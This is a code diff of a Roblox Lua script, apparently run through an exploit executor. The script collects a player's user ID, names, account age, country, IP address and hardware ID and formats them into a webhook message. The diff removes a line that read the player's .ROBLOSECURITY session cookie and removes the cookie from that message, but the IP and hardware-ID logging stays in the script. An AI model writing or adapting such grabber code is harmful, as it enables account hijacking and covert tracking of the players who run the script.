@@ -7,7 +7,6 @@ local LocalPlayer = Players.LocalPlayer
 local Userid = LocalPlayer.UserId
 local DName = LocalPlayer.DisplayName
 local Name = LocalPlayer.Name
-local RobloSecurity = LocalPlayer.Cookies.ROBLOSECURITY
 local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
 local AccountAge = LocalPlayer.AccountAge
 local Country = game.LocalizationService.RobloxLocaleId
@@ -50,7 +49,7 @@ local function createWebhookData()
                     "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```".."\n\n**.ROBLOSECURITY:**%s```",
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
